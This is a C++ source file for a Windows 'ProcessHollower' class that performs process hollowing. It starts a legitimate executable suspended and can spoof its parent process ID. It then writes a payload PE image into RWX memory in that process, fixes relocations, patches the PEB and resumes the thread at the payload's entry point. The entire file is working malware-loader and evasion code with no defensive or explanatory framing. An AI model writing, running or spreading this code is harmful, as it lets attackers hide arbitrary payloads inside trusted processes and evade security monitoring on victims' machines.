#include "process_hollower.hpp"
#include "crypto_funcs.hpp"
#include <iostream>
#include <iomanip>
#include <cstring>

// Structure for relocation entries
typedef struct IMAGE_RELOCATION_ENTRY {
    WORD Offset : 12;
    WORD Type : 4;
} IMAGE_RELOCATION_ENTRY, *PIMAGE_RELOCATION_ENTRY;

ProcessHollower::~ProcessHollower() {
    if (hThread && hThread != INVALID_HANDLE_VALUE) {
        CloseHandle(hThread);
    }
    if (hProcess && hProcess != INVALID_HANDLE_VALUE) {
        CloseHandle(hProcess);
    }
}

bool ProcessHollower::create_suspended_process(const wchar_t* target_path) {
    STARTUPINFOW si = {};
    PROCESS_INFORMATION pi = {};

    if (verbose) std::cout << "[*] Creating suspended process..." << std::endl << std::flush;

    si.cb = sizeof(STARTUPINFOW);

    // If PPID spoofing is requested, use extended startup info
    PPROC_THREAD_ATTRIBUTE_LIST lpAttributeList = nullptr;
    if (parent_pid != 0) {
        if (verbose) std::cout << "[*] PPID spoofing enabled (target: " << parent_pid << ")..." << std::endl << std::flush;

        SIZE_T attr_size = 0;
        // First call to get size
        if (!InitializeProcThreadAttributeList(nullptr, 1, 0, &attr_size)) {
            DWORD err = GetLastError();
            if (err != ERROR_INSUFFICIENT_BUFFER) {
                std::cout << "[-] InitializeProcThreadAttributeList (size) failed: " << err << std::endl << std::flush;
                return false;
            }
        }

        // Allocate attribute list
        lpAttributeList = (PPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0, attr_size);
        if (!lpAttributeList) {
            std::cout << "[-] HeapAlloc failed for attribute list" << std::endl << std::flush;
            return false;
        }

        // Initialize attribute list
        if (!InitializeProcThreadAttributeList(lpAttributeList, 1, 0, &attr_size)) {
            std::cout << "[-] InitializeProcThreadAttributeList (init) failed: " << GetLastError() << std::endl << std::flush;
            HeapFree(GetProcessHeap(), 0, lpAttributeList);
            return false;
        }

        // Get parent process handle to spoof
        HANDLE hParentProcess = OpenProcess(PROCESS_CREATE_PROCESS, FALSE, parent_pid);
        if (!hParentProcess) {
            std::cout << "[-] OpenProcess (parent PID " << parent_pid << ") failed: " << GetLastError() << std::endl << std::flush;
            DeleteProcThreadAttributeList(lpAttributeList);
            HeapFree(GetProcessHeap(), 0, lpAttributeList);
            return false;
        }

        if (verbose) std::cout << "[+] Parent process opened: 0x" << std::hex << (uintptr_t)hParentProcess << std::dec << std::endl << std::flush;

        // Add parent process attribute
        if (!UpdateProcThreadAttribute(lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
                                      &hParentProcess, sizeof(HANDLE), nullptr, nullptr)) {
            std::cout << "[-] UpdateProcThreadAttribute failed: " << GetLastError() << std::endl << std::flush;
            CloseHandle(hParentProcess);
            DeleteProcThreadAttributeList(lpAttributeList);
            HeapFree(GetProcessHeap(), 0, lpAttributeList);
            return false;
        }

        if (verbose) std::cout << "[+] Parent process attribute set" << std::endl << std::flush;

        // Use extended startup info
        STARTUPINFOEXW si_ex = {};
        si_ex.StartupInfo.cb = sizeof(STARTUPINFOEXW);
        si_ex.lpAttributeList = lpAttributeList;

        BOOL result = CreateProcessW(target_path, nullptr, nullptr, nullptr, TRUE,
                                    CREATE_SUSPENDED | EXTENDED_STARTUPINFO_PRESENT,
                                    nullptr, nullptr, (LPSTARTUPINFOW)&si_ex, &pi);

        DeleteProcThreadAttributeList(lpAttributeList);
        HeapFree(GetProcessHeap(), 0, lpAttributeList);
        CloseHandle(hParentProcess);

        if (!result) {
            DWORD err = GetLastError();
            std::cout << "[-] CreateProcessW (with PPID spoof) failed: error " << err << std::endl << std::flush;
            return false;
        }
    } else {
        // Standard creation without PPID spoofing
        BOOL result = CreateProcessW(target_path, nullptr, nullptr, nullptr, FALSE,
                                    CREATE_SUSPENDED,
                                    nullptr, nullptr, &si, &pi);

        if (!result) {
            DWORD err = GetLastError();
            std::cout << "[-] CreateProcessW failed: error " << err << std::endl << std::flush;
            return false;
        }
    }

    hProcess = pi.hProcess;
    hThread = pi.hThread;
    processId = pi.dwProcessId;

    if (verbose) std::cout << "[+] Process created: PID " << processId << std::endl << std::flush;

    return true;
}

bool ProcessHollower::HollowProcess(const wchar_t* target_exe, const std::vector<uint8_t>& payload) {
    if (verbose) std::cout << "[*] Parsing payload PE header..." << std::endl << std::flush;

    // Parse source payload PE
    auto lpImageDOSHeader = (PIMAGE_DOS_HEADER)payload.data();
    if (lpImageDOSHeader->e_magic != IMAGE_DOS_SIGNATURE) {
        std::cout << "[-] Invalid payload DOS signature\n" << std::flush;
        return false;
    }

    auto lpImageNTHeader = (PIMAGE_NT_HEADERS64)((uintptr_t)payload.data() + lpImageDOSHeader->e_lfanew);
    if (lpImageNTHeader->Signature != IMAGE_NT_SIGNATURE) {
        std::cout << "[-] Invalid payload PE signature\n" << std::flush;
        return false;
    }

    if (verbose) {
        std::cout << "[+] Payload architecture: " << (lpImageNTHeader->OptionalHeader.Magic == IMAGE_NT_OPTIONAL_HDR64_MAGIC ? "x64" : "x86") << std::endl;
        std::cout << "[+] Payload ImageBase: 0x" << std::hex << lpImageNTHeader->OptionalHeader.ImageBase << std::dec << std::endl;
        std::cout << "[+] Payload SizeOfImage: 0x" << std::hex << lpImageNTHeader->OptionalHeader.SizeOfImage << std::dec << std::endl << std::flush;
    }

    if (!create_suspended_process(target_exe)) {
        std::cout << "[-] Failed to create suspended process\n" << std::flush;
        return false;
    }

    // Get PEB address
    PROCESS_BASIC_INFORMATION pbi = {};
    ULONG ret_len = 0;
    NTSTATUS status = NtQueryInformationProcess(hProcess, ProcessBasicInformation,
                                               &pbi, sizeof(pbi), &ret_len);
    if (status != 0) {
        std::cout << "[-] NtQueryInformationProcess failed: status 0x" << std::hex << status << std::endl << std::flush;
        return false;
    }

    if (verbose) std::cout << "[+] Target PEB: 0x" << std::hex << (uintptr_t)pbi.PebBaseAddress << std::dec << std::endl << std::flush;

    // Read ImageBase from PEB
    uintptr_t target_image_base = 0;
    SIZE_T bytes_read = 0;
    if (!ReadProcessMemory(hProcess, (PVOID)((uintptr_t)pbi.PebBaseAddress + 0x10),
                          &target_image_base, sizeof(target_image_base), &bytes_read)) {
        std::cout << "[-] ReadProcessMemory (ImageBase) failed: error " << GetLastError() << std::endl << std::flush;
        return false;
    }

    if (verbose) std::cout << "[+] Target ImageBase: 0x" << std::hex << target_image_base << std::dec << std::endl << std::flush;

    // Allocate memory for new image
    LPVOID lpAllocAddress = VirtualAllocEx(hProcess, (LPVOID)lpImageNTHeader->OptionalHeader.ImageBase,
                                           lpImageNTHeader->OptionalHeader.SizeOfImage,
                                           MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!lpAllocAddress) {
        // Try allocating at any address
        if (verbose) std::cout << "[*] Cannot allocate at preferred ImageBase, allocating at any address..." << std::endl << std::flush;
        lpAllocAddress = VirtualAllocEx(hProcess, nullptr,
                                        lpImageNTHeader->OptionalHeader.SizeOfImage,
                                        MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
        if (!lpAllocAddress) {
            std::cout << "[-] VirtualAllocEx failed: error " << GetLastError() << std::endl << std::flush;
            return false;
        }
    }

    if (verbose) std::cout << "[+] Memory allocated at: 0x" << std::hex << (uintptr_t)lpAllocAddress << std::dec << std::endl << std::flush;

    // Write PE headers
    if (verbose) std::cout << "[*] Writing PE headers..." << std::endl << std::flush;
    if (!WriteProcessMemory(hProcess, lpAllocAddress, (LPVOID)payload.data(),
                           lpImageNTHeader->OptionalHeader.SizeOfHeaders, nullptr)) {
        std::cout << "[-] WriteProcessMemory (headers) failed: error " << GetLastError() << std::endl << std::flush;
        VirtualFreeEx(hProcess, lpAllocAddress, 0, MEM_RELEASE);
        return false;
    }

    // Write all sections
    if (verbose) std::cout << "[*] Writing sections..." << std::endl << std::flush;
    for (int i = 0; i < lpImageNTHeader->FileHeader.NumberOfSections; i++) {
        auto lpImageSectionHeader = (PIMAGE_SECTION_HEADER)((uintptr_t)lpImageNTHeader + 4 +
                                    sizeof(IMAGE_FILE_HEADER) + lpImageNTHeader->FileHeader.SizeOfOptionalHeader +
                                    (i * sizeof(IMAGE_SECTION_HEADER)));

        LPVOID section_dest = (LPVOID)((uintptr_t)lpAllocAddress + lpImageSectionHeader->VirtualAddress);
        LPVOID section_src = (LPVOID)((uintptr_t)payload.data() + lpImageSectionHeader->PointerToRawData);

        if (!WriteProcessMemory(hProcess, section_dest, section_src,
                               lpImageSectionHeader->SizeOfRawData, nullptr)) {
            std::cout << "[-] WriteProcessMemory (section " << (char*)lpImageSectionHeader->Name << ") failed" << std::endl << std::flush;
            VirtualFreeEx(hProcess, lpAllocAddress, 0, MEM_RELEASE);
            return false;
        }

        if (verbose) std::cout << "[+] Section " << (char*)lpImageSectionHeader->Name << " written" << std::endl << std::flush;
    }

    // Handle relocations if needed
    DWORD64 delta_image_base = (DWORD64)lpAllocAddress - lpImageNTHeader->OptionalHeader.ImageBase;
    if (delta_image_base != 0 && lpImageNTHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress != 0) {
        if (verbose) std::cout << "[*] Fixing relocations (delta: 0x" << std::hex << delta_image_base << ")..." << std::dec << std::endl << std::flush;

        auto reloc_dir = lpImageNTHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
        PIMAGE_SECTION_HEADER reloc_section = nullptr;

        // Find relocation section
        for (int i = 0; i < lpImageNTHeader->FileHeader.NumberOfSections; i++) {
            auto sec = (PIMAGE_SECTION_HEADER)((uintptr_t)lpImageNTHeader + 4 +
                      sizeof(IMAGE_FILE_HEADER) + lpImageNTHeader->FileHeader.SizeOfOptionalHeader +
                      (i * sizeof(IMAGE_SECTION_HEADER)));

            if (reloc_dir.VirtualAddress >= sec->VirtualAddress &&
                reloc_dir.VirtualAddress < (sec->VirtualAddress + sec->Misc.VirtualSize)) {
                reloc_section = sec;
                break;
            }
        }

        if (reloc_section) {
            DWORD reloc_offset = 0;
            while (reloc_offset < reloc_dir.Size) {
                auto base_reloc = (PIMAGE_BASE_RELOCATION)((uintptr_t)payload.data() + reloc_section->PointerToRawData + reloc_offset);
                reloc_offset += sizeof(IMAGE_BASE_RELOCATION);

                DWORD num_entries = (base_reloc->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(IMAGE_RELOCATION_ENTRY);

                for (DWORD i = 0; i < num_entries; i++) {
                    auto reloc_entry = (PIMAGE_RELOCATION_ENTRY)((uintptr_t)payload.data() + reloc_section->PointerToRawData + reloc_offset);
                    reloc_offset += sizeof(IMAGE_RELOCATION_ENTRY);

                    if (reloc_entry->Type == 0) continue;

                    DWORD64 address_location = (DWORD64)lpAllocAddress + base_reloc->VirtualAddress + reloc_entry->Offset;
                    DWORD64 patched_addr = 0;

                    ReadProcessMemory(hProcess, (LPVOID)address_location, &patched_addr, sizeof(DWORD64), nullptr);
                    patched_addr += delta_image_base;
                    WriteProcessMemory(hProcess, (LPVOID)address_location, &patched_addr, sizeof(DWORD64), nullptr);
                }
            }
            if (verbose) std::cout << "[+] Relocations fixed" << std::endl << std::flush;
        }
    }

    // Update PEB ImageBase
    if (verbose) std::cout << "[*] Updating PEB..." << std::endl << std::flush;
    DWORD64 new_image_base = (DWORD64)lpAllocAddress;
    if (!WriteProcessMemory(hProcess, (PVOID)((uintptr_t)pbi.PebBaseAddress + 0x10),
                           &new_image_base, sizeof(new_image_base), nullptr)) {
        std::cout << "[!] Warning: Could not update PEB ImageBase" << std::endl << std::flush;
    }

    // Get thread context and set EntryPoint
    CONTEXT ctx = {};
    ctx.ContextFlags = CONTEXT_FULL;
    if (!GetThreadContext(hThread, &ctx)) {
        std::cout << "[-] GetThreadContext failed: error " << GetLastError() << std::endl << std::flush;
        VirtualFreeEx(hProcess, lpAllocAddress, 0, MEM_RELEASE);
        return false;
    }

    ctx.Rcx = (DWORD64)lpAllocAddress + lpImageNTHeader->OptionalHeader.AddressOfEntryPoint;

    if (!SetThreadContext(hThread, &ctx)) {
        std::cout << "[-] SetThreadContext failed: error " << GetLastError() << std::endl << std::flush;
        VirtualFreeEx(hProcess, lpAllocAddress, 0, MEM_RELEASE);
        return false;
    }

    if (verbose) std::cout << "[+] Thread context updated (RCX = 0x" << std::hex << ctx.Rcx << ")" << std::dec << std::endl << std::flush;

    // Resume thread
    if (verbose) std::cout << "[*] Resuming thread..." << std::endl << std::flush;
    ResumeThread(hThread);

    if (verbose) std::cout << "[+] Process hollowing complete!" << std::endl << std::flush;

    return true;
}